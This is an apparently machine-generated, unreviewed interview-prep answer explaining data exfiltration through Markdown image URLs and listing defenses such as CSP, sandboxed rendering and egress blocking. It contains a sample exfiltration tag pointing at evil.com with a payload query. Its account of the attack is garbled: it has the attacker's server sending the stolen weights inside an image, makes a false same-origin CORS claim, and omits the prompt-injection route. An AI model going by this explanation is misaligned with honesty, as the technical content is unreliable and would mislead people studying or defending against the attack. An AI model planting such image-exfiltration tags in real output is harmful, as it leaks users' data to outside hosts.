---
qid: ing_2c913909a1__faang__local
question: 'Explain: A model-extraction / data-exfiltration attack via markdown images:
  explain it end to end and how you''d defend.'
topic: AI
model: openai/gpt-oss-20b
provider: lmstudio
input_tokens: 248
output_tokens: 558
total_tokens: 806
web_searches: 0
cost_usd: 0.0
generated_at: '2026-09-06T20:26:33-05:00'
sources: []
---

**Clarify**  
The question asks for a full‑cycle description of an adversary who, by sending a crafted Markdown file with embedded image URLs, extracts a proprietary ML model or confidential data from a host that renders the Markdown (e.g., a web app). We’ll assume the target can fetch external images and that the rendering environment has limited sandboxing.

**Approach**  
1. **Payload design** – embed an `<img src="http://evil.com/steal?payload=…">` in Markdown.  
2. **Trigger** – when the renderer parses the file, it issues an HTTP request to the attacker’s server.  
3. **Exfiltration channel** – the attacker supplies a specially crafted image that contains a payload (e.g., base64‑encoded model weights or a script executed via a browser vulnerability).  
4. **Data capture** – on our side we log the request, decode the payload, and store the stolen model/data.

**Depth**  
- *Attack vector*: The image URL forces an outbound HTTP(S) call; if the renderer runs untrusted code (e.g., `img` tags in a browser), it can execute JavaScript or leverage a CVE to read local files.  
- *Exfiltration method*: Base64‑encoded binary data is sent as query parameters or POST body, circumventing CORS by using the same origin of the renderer.  
- *Defense*:
  - **Content Security Policy (CSP)**: disallow external images or restrict `img-src` to trusted domains.  
  - **Sandboxed rendering**: run Markdown parser in a VM/iframe with no network access.  
  - **Input sanitization**: strip `<img>` tags or replace URLs with placeholders before rendering.  
  - **Network egress controls**: block outbound HTTP(S) from the rendering service.

**Edge Cases**  
- If the renderer supports relative URLs, attackers could host a malicious image on an internal server; CSP must cover `self`.  
- Some Markdown engines auto‑escape URLs; we’d test both raw and escaped forms.  
- Attackers may use data URIs (`data:image/png;base64,…`) to bypass network controls—sanitize those too.

**Optimize & Communicate**  
Explain that the core defense is *defense in depth*: limit outbound traffic, sandbox rendering, and sanitize input. Emphasize that even a single untrusted `<img>` tag can be a vector for model theft, so CSP + sandboxing is essential. This narrative shows structured reasoning, technical detail, and practical mitigation—key signals for FAANG interviewers.

_Written by openai/gpt-oss-20b running locally. Machine-generated, not reviewed._
